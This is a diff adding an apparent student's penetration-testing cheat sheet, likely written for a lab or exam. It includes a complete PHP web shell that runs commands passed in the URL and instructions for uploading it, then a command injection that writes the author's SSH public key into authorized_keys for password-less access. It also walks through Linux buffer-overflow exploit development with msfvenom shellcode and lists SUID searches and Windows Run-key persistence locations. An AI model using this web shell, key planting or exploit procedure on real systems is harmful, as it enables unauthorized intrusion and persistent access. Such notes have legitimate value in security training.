@@ -1,0 +1,163 @@
+==================================================================================
+REVIEW
+
+Always look at robots.txt if there is one
+
+for command injection with webshell php
+look for /uploads or /upload
+find place that takes uploads and upload the file. Then you can do it
+
+  <HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+
+This is what you are uploading to it it is a .php file
+
+
+ssh-keygen -t rsa
+	leave it default
+		upload the .pub one
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7NOBplSONU6JqiWSFPdd+4+tUSC6Fmk4ir/dy/yMv4mdRuol186jqDVr8nPxspJU0WZITFezV+dGAQND7/xY29Wd9d3OtTL1V1p8mfL6AfkADLDQxMYw9DhmN8Dc+2InHB+cToBOREtybbe6mN3C+hgCpitGT9ltE+8Tylx5NOoyV8MR7W2NJXd+PBEhLXn7xXcR2/u8IxebSjzrUmnYgVxJ1H3EISi5KG+HorJx5nY5AnatCgUtu+nR8TuqI+T2I8SS94VSv4J8P6DQ79lkswBayXMqvyClSzg0FI+QnITmqTtG0lgutFxYq6NlsssOvVKGKTYD/Sgy2W4eiQMkp student@lin-ops
+
+This will always work for this machine
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7NOBplSONU6JqiWSFPdd+4+tUSC6Fmk4ir/dy/yMv4mdRuol186jqDVr8nPxspJU0WZITFezV+dGAQND7/xY29Wd9d3OtTL1V1p8mfL6AfkADLDQxMYw9DhmN8Dc+2InHB+cToBOREtybbe6mN3C+hgCpitGT9ltE+8Tylx5NOoyV8MR7W2NJXd+PBEhLXn7xXcR2/u8IxebSjzrUmnYgVxJ1H3EISi5KG+HorJx5nY5AnatCgUtu+nR8TuqI+T2I8SS94VSv4J8P6DQ79lkswBayXMqvyClSzg0FI+QnITmqTtG0lgutFxYq6NlsssOvVKGKTYD/Sgy2W4eiQMkp student@lin-ops" > /var/www/.ssh/authorized_keys
+		users home directory not always /var/www/.ssh/
+
+double check if the directory .ssh is there, if not, make it with mkdir .ssh
+then use the echo command into command injection line
+
+then ssh into it, it wont ask for a password, if it does, do the echo command again
+
+use ABSOLUTE PATHS for everything
+
+======================================================================================
+
+Linux Buffer Overflow - Do this one last
+	which gdb
+	sudo -l
+	find / -type f -perm /2000 2>/dev/null
+
+1. scp the exploitable file to my box
+
+2. run it - see if you can overflow it (segmentation fault
+
+3. gdb <func name>
+
+4. pdisass main - everything has a main function
+	follow the functions
+
+5. pdisass getuserinput
+	printf is not the function
+
+6. vim lin_buff.py - wiremask.eu/tools/buffer-overflow-pattern-generator (generate 200)
+	overflow = "generated 200"
+	print(overflow)
+
+7. gdb <func name>
+	run <<< $(python lin_buff.py) - if userinput
+	run $(python lin_buff.py) - if parameter
+8. grab eip take it into wiremask	
+
+9. replace overflow with "A" * offset value
+	overflow = "A" * 62	
+	eip = "B" * 4
+
+10. confirm we replaced the eip with quad bs, run step 7 again
+
+11. env - gdb <func name>
+	show env
+		unset env LINES
+		unset env COLUMNS
+	 run
+		overflow it
+	info proc map
+		find /b <line below heap>,<line above stack>,0xff,0xe4 
+			grab a few eips and copy into script commented out
+
+12. in script put eip in reverse endian
+	so if its AABBCCDD
+		its gonna be \xDD\xCC\xBB\xAA
+
+13. nop sled
+	nop = '\x90' * 10
+
+14. msfvenom -p linux/x86/exec CMD="whoami" -b '/x00' -f python
+	print the output into script
+
+15. Verify we have overflow + eip + nop + buf
+
+16. ./func <<< $(python lin_buff.py)
+	if it doesnt work verify everything first, then if nothing is wrong, regen 		shellcode step 14
+
+17. now we move this over to the target machine and redo the eip info proc map step
+
+IF WE ARE GIVEN AN EXE WE DO NOT NEED TO EXPLOIT DEVELOPMENT IT
+
+======================================================================================
+
+Reverse Engineering
+	Analyze with ghidra
+		search for string
+			Enter
+
+		function, we want it to say success read from success up
+			follow the functions
+				change hex to decimal
+					if we say param it may be user input
+
+may need to bit shift
+	2 >> 4
+	16 << 4
+
+=======================================================================================
+
+If we have to check audit security settings we need to priv esc first
+
+auditpol /get /category:* | findstr /i "success failure"
+	run as administrator on cmd prompt
+
+Persistence on windows
+	Run keys
+
+		HKLM/software/microsoft/windows/currentversion/run
+		HKLM/software/microsoft/windows/currentversion/runonce
+		HKU/software/microsoft/windows/currentversion/run
+		HKU/software/microsoft/windows/currentversion/runonce
+
+check rsyslog
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
